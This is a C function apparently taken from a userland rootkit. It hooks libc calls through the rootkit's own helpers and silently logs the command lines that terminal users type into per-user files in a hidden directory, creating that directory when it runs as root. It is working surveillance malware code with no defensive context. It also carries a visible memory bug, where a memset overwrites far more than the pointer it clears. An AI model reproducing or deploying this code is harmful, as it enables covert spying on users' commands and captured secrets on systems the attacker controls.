void peepargv(char *const argv[]){
    if(rknomore())
        return;

    if(!stdout) return;
    int outfd = fileno(stdout);
    if(!isatty(outfd)) return;

    DIR *dp;
    hook(COPENDIR);
    dp = call(COPENDIR, EXEC_LOGS);
    if(dp == NULL && errno == ENOENT){
        if(notuser(0)) return;
        preparedir(EXEC_LOGS, readgid());
        peepargv(argv);
        return;
    }else if(dp == NULL) return;
    else if(dp != NULL) closedir(dp);

    char buf[512];
    memset(buf, 0, sizeof(buf));

    size_t tmpsize, buflen;
    for(int i=0; argv[i] != NULL; i++){
        tmpsize = strlen(argv[i])+2;
        buflen = strlen(buf);

        if(buflen+tmpsize >= sizeof(buf)-1)
            break;

        char tmp[tmpsize];
        memset(tmp, 0, sizeof(tmp));
        snprintf(tmp, sizeof(tmp), "%s ", argv[i]);
        strncat(buf, tmp, tmpsize);
    }
    buf[strlen(buf)-1]='\n';
    buf[strlen(buf)]='\0';

#ifdef MAX_LOGS_SIZE
    off_t newpeep = getnewdirsize(EXEC_LOGS, strlen(buf)+1);
    if(newpeep > MAX_LOGS_SIZE)
        return;
#endif

    char dest[LEN_EXEC_LOGS+128];
    memset(dest, 0, sizeof(dest));

    uid_t myuid = getuid();
    hook(CGETPWUID);
    struct passwd *pwu;
    memset(&pwu, 0, sizeof(struct passwd));
    pwu = call(CGETPWUID, myuid);
    if(pwu == NULL)
        snprintf(dest, sizeof(dest)-1, "%s/%u", EXEC_LOGS, myuid);
    else
        snprintf(dest, sizeof(dest)-1, "%s/%s", EXEC_LOGS, pwu->pw_name);

    FILE *fp;
    hook(CFOPEN, CFWRITE);
    fp = call(CFOPEN, dest, "a");
    if(fp == NULL) return;
    call(CFWRITE, buf, 1, strlen(buf), fp);
    fflush(fp);
    fclose(fp);
}